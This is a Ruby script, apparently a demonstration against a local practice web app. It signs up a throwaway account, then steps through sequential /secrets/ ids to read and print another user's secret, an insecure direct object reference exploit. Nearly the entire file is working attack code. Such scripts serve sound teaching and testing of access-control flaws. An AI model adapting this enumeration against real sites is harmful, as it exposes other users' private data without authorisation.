#!/usr/bin/env ruby

require 'mechanize'

target_name = 'Bruce Wayne'

Mechanize.new.instance_eval do
  get 'http://localhost:3000'

  # Register a new account
  page.link_with(text: 'Sign up').click

  email, password = "ali+#{rand(10000)}@happybearsoftware.com", '12345678'

  page.forms.first.tap do |f|
    f['user[name]']                  = 'Fred Fredson'
    f['user[email]']                 = email
    f['user[password]']              = password
    f['user[password_confirmation]'] = password
    f.submit
  end

  # Visit 'Your secret' page
  page.link_with(text: 'Your Secret').click

  # Iterate the secret id's from 0 => ours
  my_secret_id = page.uri.path.split('/').last.to_i

    (1..my_secret_id).each do |id|
      begin
        # Visit the secret with this id
        get "/secrets/#{id}"

        # Extract the name of the user this secret belongs to
        name = page.search('h1').text.strip.match(/Here's your secret (.*)$/).captures.first

        # Output the secret and exit if the name matches the target name
        if target_name == name
          puts page.search('.secret').text.strip
          exit
        end
      rescue Mechanize::ResponseCodeError
        # Don't care about responses with bad codes
      end
    end
end
